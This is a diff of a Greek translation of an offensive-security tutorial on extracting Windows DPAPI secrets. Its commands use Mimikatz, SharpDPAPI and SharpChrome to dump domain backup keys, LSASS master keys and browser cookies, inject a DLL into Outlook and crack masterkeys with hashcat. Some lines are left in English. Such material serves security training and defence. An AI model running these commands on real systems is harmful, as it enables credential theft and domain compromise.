@@ -1,4 +1,4 @@
-# DPAPI - Εξαγωγή Κωδικών
+# DPAPI - Εξαγωγή Κωδικών Πρόσβασης
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -6,33 +6,33 @@
 
 ## Τι είναι το DPAPI
 
-Η API Προστασίας Δεδομένων (DPAPI) χρησιμοποιείται κυρίως στο λειτουργικό σύστημα Windows για την **συμμετρική κρυπτογράφηση ασύμμετρων ιδιωτικών κλειδιών**, εκμεταλλευόμενη είτε μυστικά χρήστη είτε συστήματος ως σημαντική πηγή εντροπίας. Αυτή η προσέγγιση απλοποιεί την κρυπτογράφηση για τους προγραμματιστές, επιτρέποντάς τους να κρυπτογραφούν δεδομένα χρησιμοποιώντας ένα κλειδί που προέρχεται από τα μυστικά σύνδεσης του χρήστη ή, για την κρυπτογράφηση του συστήματος, τα μυστικά αυθεντικοποίησης του τομέα του συστήματος, αποφεύγοντας έτσι την ανάγκη οι προγραμματιστές να διαχειρίζονται την προστασία του κλειδιού κρυπτογράφησης οι ίδιοι.
+The Data Protection API (DPAPI) χρησιμοποιείται κυρίως στο λειτουργικό σύστημα Windows για την **συμμετρική κρυπτογράφηση ασυμμετρικών ιδιωτικών κλειδιών**, αξιοποιώντας είτε μυστικά χρήστη είτε μυστικά συστήματος ως σημαντική πηγή εντροπίας. Αυτή η προσέγγιση απλοποιεί την κρυπτογράφηση για τους προγραμματιστές, επιτρέποντάς τους να κρυπτογραφούν δεδομένα χρησιμοποιώντας ένα κλειδί που προέρχεται από τα διαπιστευτήρια σύνδεσης του χρήστη ή, για κρυπτογράφηση συστήματος, από τα μυστικά πιστοποίησης του domain του συστήματος, αποφεύγοντας έτσι την ανάγκη οι προγραμματιστές να διαχειρίζονται την προστασία του κλειδιού κρυπτογράφησης.
 
-Ο πιο κοινός τρόπος χρήσης του DPAPI είναι μέσω των **`CryptProtectData` και `CryptUnprotectData`** συναρτήσεων, οι οποίες επιτρέπουν στις εφαρμογές να κρυπτογραφούν και να αποκρυπτογραφούν δεδομένα με ασφάλεια με τη συνεδρία της διαδικασίας που είναι συνδεδεμένη. Αυτό σημαίνει ότι τα κρυπτογραφημένα δεδομένα μπορούν να αποκρυπτογραφηθούν μόνο από τον ίδιο χρήστη ή το σύστημα που τα κρυπτογράφησε.
+Ο πιο κοινός τρόπος χρήσης του DPAPI είναι μέσω των **`CryptProtectData` και `CryptUnprotectData`** συναρτήσεων, οι οποίες επιτρέπουν στις εφαρμογές να κρυπτογραφούν και να αποκρυπτογραφούν δεδομένα με ασφάλεια με τη συνεδρία της διεργασίας που είναι αυτή τη στιγμή συνδεδεμένη. Αυτό σημαίνει ότι τα κρυπτογραφημένα δεδομένα μπορούν να αποκρυπτογραφηθούν μόνο από τον ίδιο χρήστη ή σύστημα που τα κρυπτογράφησε.
 
-Επιπλέον, αυτές οι συναρτήσεις δέχονται επίσης μια **παράμετρο `entropy`** η οποία θα χρησιμοποιηθεί κατά την κρυπτογράφηση και την αποκρυπτογράφηση, επομένως, για να αποκρυπτογραφήσετε κάτι που έχει κρυπτογραφηθεί χρησιμοποιώντας αυτή την παράμετρο, πρέπει να παρέχετε την ίδια τιμή εντροπίας που χρησιμοποιήθηκε κατά την κρυπτογράφηση.
+Επιπλέον, αυτές οι συναρτήσεις δέχονται επίσης μια παράμετρο **`entropy`** η οποία θα χρησιμοποιηθεί κατά την κρυπτογράφηση και την αποκρυπτογράφηση· επομένως, για να αποκρυπτογραφήσετε κάτι που κρυπτογραφήθηκε χρησιμοποιώντας αυτή την παράμετρο, πρέπει να παρέχετε την ίδια τιμή εντροπίας που χρησιμοποιήθηκε κατά την κρυπτογράφηση.
 
-### Δημιουργία κλειδιών χρηστών
+### Δημιουργία κλειδιού χρήστη
 
-Το DPAPI δημιουργεί ένα μοναδικό κλειδί (που ονομάζεται **`pre-key`**) για κάθε χρήστη με βάση τα διαπιστευτήριά τους. Αυτό το κλειδί προέρχεται από τον κωδικό πρόσβασης του χρήστη και άλλους παράγοντες και ο αλγόριθμος εξαρτάται από τον τύπο του χρήστη αλλά καταλήγει να είναι SHA1. Για παράδειγμα, για χρήστες τομέα, **εξαρτάται από το HTLM hash του χρήστη**.
+The DPAPI δημιουργεί ένα μοναδικό κλειδί (ονομαζόμενο **`pre-key`**) για κάθε χρήστη βασισμένο στα διαπιστευτήριά του. Αυτό το κλειδί παράγεται από τον κωδικό πρόσβασης του χρήστη και άλλους παράγοντες και ο αλγόριθμος εξαρτάται από τον τύπο χρήστη αλλά τελικά καταλήγει να είναι SHA1. Για παράδειγμα, για χρήστες του domain, **εξαρτάται από το NTLM hash του χρήστη**.
 
-Αυτό είναι ιδιαίτερα ενδιαφέρον γιατί αν ένας επιτιθέμενος μπορέσει να αποκτήσει το hash του κωδικού πρόσβασης του χρήστη, μπορεί να:
+Αυτό είναι ιδιαίτερα ενδιαφέρον γιατί αν ένας επιτιθέμενος μπορέσει να αποκτήσει το hash του κωδικού πρόσβασης του χρήστη, μπορεί:
 
-- **Αποκρυπτογραφήσει οποιαδήποτε δεδομένα έχουν κρυπτογραφηθεί χρησιμοποιώντας DPAPI** με το κλειδί αυτού του χρήστη χωρίς να χρειάζεται να επικοινωνήσει με καμία API
-- Προσπαθήσει να **σπάσει τον κωδικό πρόσβασης** εκτός σύνδεσης προσπαθώντας να δημιουργήσει το έγκυρο κλειδί DPAPI
+- Να **αποκρυπτογραφήσει οποιαδήποτε δεδομένα είχαν κρυπτογραφηθεί χρησιμοποιώντας DPAPI** με το κλειδί αυτού του χρήστη χωρίς να χρειάζεται να απευθυνθεί σε κάποιο API
+- Να προσπαθήσει να **σπάσει τον κωδικό offline** προσπαθώντας να δημιουργήσει το έγκυρο κλειδί DPAPI
 
-Επιπλέον, κάθε φορά που κάποια δεδομένα κρυπτογραφούνται από έναν χρήστη χρησιμοποιώντας DPAPI, δημιουργείται ένα νέο **master key**. Αυτό το master key είναι το οποίο χρησιμοποιείται πραγματικά για την κρυπτογράφηση των δεδομένων. Κάθε master key συνοδεύεται από ένα **GUID** (Παγκόσμια Μοναδική Ταυτότητα) που το αναγνωρίζει.
+Επιπλέον, κάθε φορά που κάποια δεδομένα κρυπτογραφούνται από έναν χρήστη χρησιμοποιώντας DPAPI, δημιουργείται ένα νέο master key. Αυτό το master key είναι το οποίο χρησιμοποιείται πραγματικά για την κρυπτογράφηση των δεδομένων. Σε κάθε master key αποδίδεται ένα GUID (Globally Unique Identifier) που το ταυτοποιεί.
 
-Τα master keys αποθηκεύονται στον **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** φάκελο, όπου `{SID}` είναι ο Αναγνωριστής Ασφαλείας αυτού του χρήστη. Το master key αποθηκεύεται κρυπτογραφημένο με το **`pre-key`** του χρήστη και επίσης με ένα **κλειδί εφεδρείας τομέα** για ανάκτηση (έτσι το ίδιο κλειδί αποθηκεύεται κρυπτογραφημένο 2 φορές με 2 διαφορετικούς κωδικούς).
+Τα master keys αποθηκεύονται στον φάκελο **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, όπου {SID} είναι ο Security Identifier αυτού του χρήστη. Το master key αποθηκεύεται κρυπτογραφημένο από το **`pre-key`** του χρήστη και επίσης από ένα **domain backup key** για ανάκτηση (οπότε το ίδιο κλειδί αποθηκεύεται κρυπτογραφημένο 2 φορές με 2 διαφορετικούς τρόπους).
 
-Σημειώστε ότι το **κλειδί τομέα που χρησιμοποιείται για την κρυπτογράφηση του master key βρίσκεται στους ελεγκτές τομέα και δεν αλλάζει ποτέ**, επομένως αν ένας επιτιθέμενος έχει πρόσβαση στον ελεγκτή τομέα, μπορεί να ανακτήσει το κλειδί εφεδρείας τομέα και να αποκρυπτογραφήσει τα master keys όλων των χρηστών στον τομέα.
+Σημειώστε ότι το domain key που χρησιμοποιείται για την κρυπτογράφηση του master key βρίσκεται στους domain controllers και δεν αλλάζει ποτέ, οπότε αν ένας επιτιθέμενος έχει πρόσβαση στον domain controller, μπορεί να ανακτήσει το domain backup key και να αποκρυπτογραφήσει τα master keys όλων των χρηστών στο domain.
 
-Τα κρυπτογραφημένα blobs περιέχουν το **GUID του master key** που χρησιμοποιήθηκε για την κρυπτογράφηση των δεδομένων μέσα στις κεφαλίδες του.
+Τα κρυπτογραφημένα blobs περιέχουν το GUID του master key που χρησιμοποιήθηκε για την κρυπτογράφηση των δεδομένων μέσα στις κεφαλίδες τους.
 
 > [!TIP]
 > Τα κρυπτογραφημένα blobs του DPAPI ξεκινούν με **`01 00 00 00`**
 
-Βρείτε τα master keys:
+Find master keys:
 ```bash
 Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
 Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
@@ -41,40 +41,41 @@ Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
 Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
 Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
 ```
-Αυτό είναι πώς θα φαίνονται μια σειρά από Master Keys ενός χρήστη:
+This is what a bunch of Master Keys of a user will looks like:
 
 ![](<../../images/image (1121).png>)
 
-### Δημιουργία κλειδιών μηχανής/συστήματος
+### Δημιουργία κλειδιού μηχανής/συστήματος
 
-Αυτό είναι το κλειδί που χρησιμοποιείται για να κρυπτογραφήσει δεδομένα η μηχανή. Βασίζεται στο **DPAPI_SYSTEM LSA secret**, το οποίο είναι ένα ειδικό κλειδί που μπορεί να προσπελάσει μόνο ο χρήστης SYSTEM. Αυτό το κλειδί χρησιμοποιείται για να κρυπτογραφήσει δεδομένα που πρέπει να είναι προσβάσιμα από το ίδιο το σύστημα, όπως διαπιστευτήρια σε επίπεδο μηχανής ή μυστικά σε επίπεδο συστήματος.
+This is key used for the machine to encrypt data. It's based on the **DPAPI_SYSTEM LSA secret**, which is a special key that only the SYSTEM user can access. This key is used to encrypt data that needs to be accessible by the system itself, such as machine-level credentials or system-wide secrets.
 
-Σημειώστε ότι αυτά τα κλειδιά **δεν έχουν αντίγραφο τομέα**, οπότε είναι προσβάσιμα μόνο τοπικά:
+Note that these keys **don't have a domain backup** so they are only accesisble locally:
 
-- **Mimikatz** μπορεί να το προσπελάσει εκτελώντας dump LSA secrets με την εντολή: `mimikatz lsadump::secrets`
-- Το μυστικό αποθηκεύεται μέσα στη μητρώο, οπότε ένας διαχειριστής θα μπορούσε να **τροποποιήσει τα δικαιώματα DACL για να το προσπελάσει**. Η διαδρομή μητρώου είναι: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
+- **Mimikatz** can access it dumping LSA secrets using the command: `mimikatz lsadump::secrets`
+- The secret is stored inside the registry, so an administrator could **modify the DACL permissions to access it**. The registry path is: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
 
-### Προστατευμένα Δεδομένα από DPAPI
 
-Μεταξύ των προσωπικών δεδομένων που προστατεύονται από το DPAPI είναι:
+### Protected Data by DPAPI
 
-- Διαπιστευτήρια Windows
-- Κωδικοί πρόσβασης και δεδομένα αυτόματης συμπλήρωσης του Internet Explorer και του Google Chrome
-- Κωδικοί πρόσβασης για λογαριασμούς email και εσωτερικούς λογαριασμούς FTP για εφαρμογές όπως το Outlook και το Windows Mail
-- Κωδικοί πρόσβασης για κοινόχρηστα φακέλους, πόρους, ασύρματα δίκτυα και Windows Vault, συμπεριλαμβανομένων των κλειδιών κρυπτογράφησης
-- Κωδικοί πρόσβασης για απομακρυσμένες συνδέσεις επιφάνειας εργασίας, .NET Passport και ιδιωτικά κλειδιά για διάφορους σκοπούς κρυπτογράφησης και αυθεντικοποίησης
-- Κωδικοί πρόσβασης δικτύου που διαχειρίζεται ο Credential Manager και προσωπικά δεδομένα σε εφαρμογές που χρησιμοποιούν CryptProtectData, όπως το Skype, το MSN messenger και άλλα
-- Κρυπτογραφημένα blobs μέσα στο μητρώο
+Among the personal data protected by DPAPI are:
+
+- Windows creds
+- Internet Explorer and Google Chrome's passwords and auto-completion data
+- E-mail and internal FTP account passwords for applications like Outlook and Windows Mail
+- Passwords for shared folders, resources, wireless networks, and Windows Vault, including encryption keys
+- Passwords for remote desktop connections, .NET Passport, and private keys for various encryption and authentication purposes
+- Network passwords managed by Credential Manager and personal data in applications using CryptProtectData, such as Skype, MSN messenger, and more
+- Encrypted blobs inside the register
 - ...
 
-Τα προστατευμένα δεδομένα του συστήματος περιλαμβάνουν:
-- Κωδικοί πρόσβασης Wifi
-- Κωδικοί πρόσβασης προγραμματισμένων εργασιών
+System protected data includes:
+- Wifi passwords
+- Scheduled task passwords
 - ...
 
 ### Επιλογές εξαγωγής Master key
 
-- Εάν ο χρήστης έχει δικαιώματα διαχειριστή τομέα, μπορεί να αποκτήσει πρόσβαση στο **domain backup key** για να αποκρυπτογραφήσει όλα τα master keys χρηστών στον τομέα:
+- Εάν ο χρήστης έχει δικαιώματα domain admin, μπορεί να αποκτήσει πρόσβαση στο **domain backup key** για να αποκρυπτογραφήσει όλα τα user master keys στον domain:
 ```bash
 # Mimikatz
 lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export
@@ -82,17 +83,17 @@ lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export
 # SharpDPAPI
 SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
 ```
-- Με τοπικά δικαιώματα διαχειριστή, είναι δυνατόν να **προσεγγίσετε τη μνήμη LSASS** για να εξάγετε τα κύρια κλειδιά DPAPI όλων των συνδεδεμένων χρηστών και το κλειδί SYSTEM.
+- Με τοπικά δικαιώματα διαχειριστή, είναι δυνατό να **αποκτήσετε πρόσβαση στη μνήμη του LSASS** για να εξάγετε τα DPAPI master keys όλων των συνδεδεμένων χρηστών και το κλειδί SYSTEM.
 ```bash
 # Mimikatz
 mimikatz sekurlsa::dpapi
 ```
-- Αν ο χρήστης έχει τοπικά δικαιώματα διαχειριστή, μπορεί να έχει πρόσβαση στο **DPAPI_SYSTEM LSA secret** για να αποκρυπτογραφήσει τα κλειδιά του μηχανήματος:
+- Εάν ο χρήστης έχει τοπικά δικαιώματα διαχειριστή, μπορεί να αποκτήσει πρόσβαση στο **DPAPI_SYSTEM LSA secret** για να αποκρυπτογραφήσει τα machine master keys:
 ```bash
 # Mimikatz
 lsadump::secrets /system:DPAPI_SYSTEM /export
 ```
-- Αν είναι γνωστός ο κωδικός πρόσβασης ή το hash NTLM του χρήστη, μπορείτε **να αποκρυπτογραφήσετε τα κύρια κλειδιά του χρήστη απευθείας**:
+- Αν το password ή το hash NTLM του χρήστη είναι γνωστό, μπορείτε να **αποκρυπτογραφήσετε απευθείας τα master keys του χρήστη**:
 ```bash
 # Mimikatz
 dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected
@@ -100,7 +101,7 @@ dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER
 # SharpDPAPI
 SharpDPAPI.exe masterkeys /password:PASSWORD
 ```
-- Αν βρίσκεστε μέσα σε μια συνεδρία ως χρήστης, είναι δυνατόν να ζητήσετε από τον DC το **backup key για να αποκρυπτογραφήσετε τα master keys χρησιμοποιώντας RPC**. Αν είστε τοπικός διαχειριστής και ο χρήστης είναι συνδεδεμένος, θα μπορούσατε να **κλέψετε το session token του** για αυτό:
+- Εάν βρίσκεστε σε session ως χρήστης, είναι δυνατό να ζητήσετε από τον DC το **backup key για να αποκρυπτογραφήσετε τα master keys χρησιμοποιώντας RPC**. Αν είστε local admin και ο χρήστης είναι συνδεδεμένος, μπορείτε να **κλέψετε το session token του** για αυτό:
 ```bash
 # Mimikatz
 dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc
@@ -108,7 +109,7 @@ dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" 
 # SharpDPAPI
 SharpDPAPI.exe masterkeys /rpc
 ```
-## Λίστα Θησαυρού
+## Λίστα Vault
 ```bash
 # From cmd
 vaultcmd /listcreds:"Windows Credentials" /all
@@ -116,25 +117,25 @@ vaultcmd /listcreds:"Windows Credentials" /all
 # From mimikatz
 mimikatz vault::list
 ```
-## Πρόσβαση σε κρυπτογραφημένα δεδομένα DPAPI
+## Πρόσβαση σε DPAPI Encrypted Data
 
-### Βρείτε κρυπτογραφημένα δεδομένα DPAPI
+### Εντοπισμός κρυπτογραφημένων δεδομένων DPAPI
 
-Κοινά αρχεία **που προστατεύονται** είναι σε:
+Τα κοινά **προστατευμένα αρχεία** χρηστών βρίσκονται σε:
 
 - `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
 - `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
 - `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
-- Ελέγξτε επίσης αλλάζοντας το `\Roaming\` σε `\Local\` στα παραπάνω μονοπάτια.
+- Ελέγξτε επίσης να αλλάξετε το `\Roaming\` σε `\Local\` στα παραπάνω μονοπάτια.
 
-Παραδείγματα αρίθμησης:
+Enumeration examples:
 ```bash
 dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
 dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 ```
-[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) μπορεί να βρει κρυπτογραφημένα blobs DPAPI στο σύστημα αρχείων, μητρώο και B64 blobs:
+[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) μπορεί να εντοπίσει κρυπτογραφημένα blobs DPAPI στο file system, registry και σε B64 blobs:
 ```bash
 # Search blobs in the registry
 search /type:registry [/path:HKLM] # Search complete registry by default
@@ -149,11 +150,11 @@ search /type:file /path:C:\path\to\file
 # Search a blob inside B64 encoded data
 search /type:base64 [/base:<base64 string>]
 ```
-Σημειώστε ότι [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (από το ίδιο αποθετήριο) μπορεί να χρησιμοποιηθεί για την αποκρυπτογράφηση ευαίσθητων δεδομένων όπως τα cookies χρησιμοποιώντας DPAPI.
+Σημειώστε ότι [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (από το ίδιο αποθετήριο) μπορεί να χρησιμοποιηθεί για να αποκρυπτογραφήσει, χρησιμοποιώντας το DPAPI, ευαίσθητα δεδομένα όπως cookies.
 
 ### Κλειδιά πρόσβασης και δεδομένα
 
-- **Χρησιμοποιήστε το SharpDPAPI** για να αποκτήσετε διαπιστευτήρια από αρχεία κρυπτογραφημένα με DPAPI από την τρέχουσα συνεδρία:
+- **Χρησιμοποιήστε SharpDPAPI** για να εξάγετε credentials από αρχεία κρυπτογραφημένα με DPAPI στην τρέχουσα συνεδρία:
 ```bash
 # Decrypt user data
 ## Note that 'triage' is like running credentials, vaults, rdg and certificates
@@ -162,7 +163,7 @@ SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect
 # Decrypt machine data
 SharpDPAPI.exe machinetriage
 ```
-- **Λάβετε πληροφορίες διαπιστευτηρίων** όπως τα κρυπτογραφημένα δεδομένα και το guidMasterKey.
+- **Λήψη πληροφοριών credentials** όπως τα encrypted data και το guidMasterKey.
 ```bash
 mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7
 
@@ -172,9 +173,9 @@ guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
 pbData             : b8f619[...snip...]b493fe
 [..]
 ```
-- **Πρόσβαση σε masterkeys**:
+- **Πρόσβαση masterkeys**:
 
-Αποκρυπτογραφήστε ένα masterkey ενός χρήστη ζητώντας το **domain backup key** χρησιμοποιώντας RPC:
+Αποκρυπτογραφήστε ένα masterkey χρήστη που ζητάει το **domain backup key** μέσω RPC:
 ```bash
 # Mimikatz
 dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc
@@ -182,7 +183,7 @@ dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" 
 # SharpDPAPI
 SharpDPAPI.exe masterkeys /rpc
 ```
-Το εργαλείο **SharpDPAPI** υποστηρίζει επίσης αυτά τα επιχειρήματα για την αποκρυπτογράφηση του masterkey (σημειώστε πώς είναι δυνατόν να χρησιμοποιήσετε το `/rpc` για να αποκτήσετε το κλειδί αντιγράφου ασφαλείας τομέα, το `/password` για να χρησιμοποιήσετε έναν απλό κωδικό πρόσβασης ή το `/pvk` για να καθορίσετε ένα αρχείο ιδιωτικού κλειδιού τομέα DPAPI...):
+Το εργαλείο **SharpDPAPI** υποστηρίζει επίσης αυτά τα επιχειρήματα για masterkey decryption (σημείωσε πώς είναι δυνατό να χρησιμοποιήσεις `/rpc` για να πάρεις το domains backup key, `/password` για να χρησιμοποιήσεις ένα plaintext password, ή `/pvk` για να καθορίσεις ένα DPAPI domain private key file...):
 ```
 /target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
 /pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
@@ -194,7 +195,7 @@ SharpDPAPI.exe masterkeys /rpc
 /server:SERVER          -   triage a remote server, assuming admin access
 /hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
 ```
-- **Αποκρυπτογράφηση δεδομένων χρησιμοποιώντας ένα masterkey**:
+- **Αποκρυπτογραφήστε δεδομένα χρησιμοποιώντας masterkey**:
 ```bash
 # Mimikatz
 dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
@@ -202,7 +203,7 @@ dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
 # SharpDPAPI
 SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
 ```
-Το εργαλείο **SharpDPAPI** υποστηρίζει επίσης αυτά τα επιχειρήματα για την αποκρυπτογράφηση `credentials|vaults|rdg|keepass|triage|blob|ps` (σημειώστε πώς είναι δυνατό να χρησιμοποιήσετε το `/rpc` για να αποκτήσετε το κλειδί αντιγράφου ασφαλείας τομέα, το `/password` για να χρησιμοποιήσετε έναν απλό κωδικό πρόσβασης, το `/pvk` για να καθορίσετε ένα αρχείο ιδιωτικού κλειδιού τομέα DPAPI, το `/unprotect` για να χρησιμοποιήσετε την τρέχουσα συνεδρία χρηστών...).
+Το εργαλείο **SharpDPAPI** υποστηρίζει επίσης αυτές τις παραμέτρους για την αποκρυπτογράφηση του `credentials|vaults|rdg|keepass|triage|blob|ps` (σημειώστε πώς είναι δυνατό να χρησιμοποιήσετε `/rpc` για να πάρετε το domains backup key, `/password` για να χρησιμοποιήσετε ένα plaintext password, `/pvk` για να καθορίσετε ένα DPAPI domain private key file, `/unprotect` για να χρησιμοποιήσετε την τρέχουσα συνεδρία του χρήστη...):
 ```
 Decryption:
 /unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
@@ -221,7 +222,7 @@ Targeting:
 Note: must use with /pvk:KEY or /password:X
 Note: not applicable to 'blob' or 'ps' commands
 ```
-- Αποκρυπτογραφήστε κάποια δεδομένα χρησιμοποιώντας **την τρέχουσα συνεδρία χρήστη**:
+- Αποκρυπτογραφήστε κάποια δεδομένα χρησιμοποιώντας τη **τρέχουσα συνεδρία χρήστη**:
 ```bash
 # Mimikatz
 dpapi::blob /in:C:\path\to\encrypted\file /unprotect
@@ -230,11 +231,11 @@ dpapi::blob /in:C:\path\to\encrypted\file /unprotect
 SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
 ```
 ---
-### Διαχείριση Προαιρετικής Εντροπίας ("Εντροπία τρίτων")
+### Διαχείριση Προαιρετικού entropy ("Third-party entropy")
 
-Ορισμένες εφαρμογές περνούν μια επιπλέον **εντροπία** στην `CryptProtectData`. Χωρίς αυτή την τιμή, το blob δεν μπορεί να αποκρυπτογραφηθεί, ακόμη και αν είναι γνωστό το σωστό masterkey. Η απόκτηση της εντροπίας είναι επομένως απαραίτητη όταν στοχεύουμε σε διαπιστευτήρια που προστατεύονται με αυτόν τον τρόπο (π.χ. Microsoft Outlook, ορισμένοι πελάτες VPN).
+Ορισμένες εφαρμογές περνούν μια πρόσθετη τιμή **entropy** στο `CryptProtectData`. Χωρίς αυτή την τιμή το blob δεν μπορεί να αποκρυπτογραφηθεί, ακόμη κι αν είναι γνωστό το σωστό masterkey. Συνεπώς, η απόκτηση του entropy είναι απαραίτητη όταν στοχεύουμε διαπιστευτήρια που προστατεύονται με αυτόν τον τρόπο (π.χ. Microsoft Outlook, κάποιοι VPN clients).
 
-[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) είναι μια DLL σε λειτουργία χρήστη που συνδέει τις λειτουργίες DPAPI μέσα στη στοχοθετημένη διαδικασία και καταγράφει διαφανώς οποιαδήποτε προαιρετική εντροπία παρέχεται. Η εκτέλεση του EntropyCapture σε **DLL-injection** λειτουργία κατά διαδικασιών όπως το `outlook.exe` ή το `vpnclient.exe` θα εξάγει ένα αρχείο που αντιστοιχεί κάθε buffer εντροπίας στη διαδικασία κλήσης και στο blob. Η καταγεγραμμένη εντροπία μπορεί αργότερα να παρασχεθεί στο **SharpDPAPI** (`/entropy:`) ή στο **Mimikatz** (`/entropy:<file>`) προκειμένου να αποκρυπτογραφηθεί τα δεδομένα.
+[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) είναι ένα user-mode DLL που hooks τις DPAPI functions μέσα στη στοχευόμενη διεργασία και καταγράφει διαφανώς οποιοδήποτε προαιρετικό entropy που παρέχεται. Η εκτέλεση του EntropyCapture σε κατάσταση **DLL-injection** εναντίον διεργασιών όπως `outlook.exe` ή `vpnclient.exe` θα παράγει ένα αρχείο που αντιστοιχίζει κάθε entropy buffer στη διεργασία που το κάλεσε και στο blob. Το καταγεγραμμένο entropy μπορεί αργότερα να παρασχεθεί στο **SharpDPAPI** (`/entropy:`) ή στο **Mimikatz** (`/entropy:<file>`) προκειμένου να αποκρυπτογραφηθούν τα δεδομένα.
 ```powershell
 # Inject EntropyCapture into the current user's Outlook
 InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll
@@ -244,7 +245,7 @@ SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
 ```
 ### Cracking masterkeys offline (Hashcat & DPAPISnoop)
 
-Η Microsoft εισήγαγε μια μορφή masterkey **context 3** ξεκινώντας από τα Windows 10 v1607 (2016). `hashcat` v6.2.6 (Δεκέμβριος 2023) πρόσθεσε hash-modes **22100** (DPAPI masterkey v1 context), **22101** (context 1) και **22102** (context 3) επιτρέποντας την επιτάχυνση cracking των κωδικών πρόσβασης χρηστών απευθείας από το αρχείο masterkey. Οι επιτιθέμενοι μπορούν επομένως να εκτελούν επιθέσεις με λίστες λέξεων ή brute-force χωρίς να αλληλεπιδρούν με το σύστημα-στόχο.
+Microsoft εισήγαγε μια μορφή **context 3** masterkey ξεκινώντας με τα Windows 10 v1607 (2016). `hashcat` v6.2.6 (December 2023) πρόσθεσε hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) και **22102** (context 3), επιτρέποντας GPU-accelerated cracking των κωδικών χρηστών απευθείας από το αρχείο masterkey. Συνεπώς οι επιτιθέμενοι μπορούν να εκτελέσουν word-list ή brute-force attacks χωρίς αλληλεπίδραση με το target system.
 
 `DPAPISnoop` (2024) αυτοματοποιεί τη διαδικασία:
 ```bash
@@ -252,11 +253,11 @@ SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
 DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
 hashcat -m 22102 bob.hc wordlist.txt -O -w4
 ```
-Το εργαλείο μπορεί επίσης να αναλύσει τα Credential και Vault blobs, να τα αποκρυπτογραφήσει με σπασμένα κλειδιά και να εξάγει τους καθαρούς κωδικούς πρόσβασης.
+Το εργαλείο μπορεί επίσης να αναλύσει τα Credential και Vault blobs, να τα αποκρυπτογραφήσει με cracked keys και να εξάγει cleartext passwords.
 
-### Πρόσβαση σε δεδομένα άλλης μηχανής
+### Πρόσβαση σε δεδομένα άλλου μηχανήματος
 
-Στο **SharpDPAPI και SharpChrome** μπορείτε να υποδείξετε την επιλογή **`/server:HOST`** για να αποκτήσετε πρόσβαση στα δεδομένα μιας απομακρυσμένης μηχανής. Φυσικά, πρέπει να μπορείτε να έχετε πρόσβαση σε αυτή τη μηχανή και στο παρακάτω παράδειγμα υποτίθεται ότι **γνωρίζεται το κλειδί κρυπτογράφησης αντιγράφου ασφαλείας τομέα**:
+Στα **SharpDPAPI and SharpChrome** μπορείτε να υποδείξετε την επιλογή **`/server:HOST`** για να αποκτήσετε πρόσβαση στα δεδομένα μιας απομακρυσμένης μηχανής. Φυσικά πρέπει να έχετε πρόσβαση σε αυτή τη μηχανή και στο ακόλουθο παράδειγμα υποτίθεται ότι το **domain backup encryption key είναι γνωστό**:
 ```bash
 SharpDPAPI.exe triage /server:HOST /pvk:BASE64
 SharpChrome cookies /server:HOST /pvk:BASE64
@@ -265,47 +266,49 @@ SharpChrome cookies /server:HOST /pvk:BASE64
 
 ### HEKATOMB
 
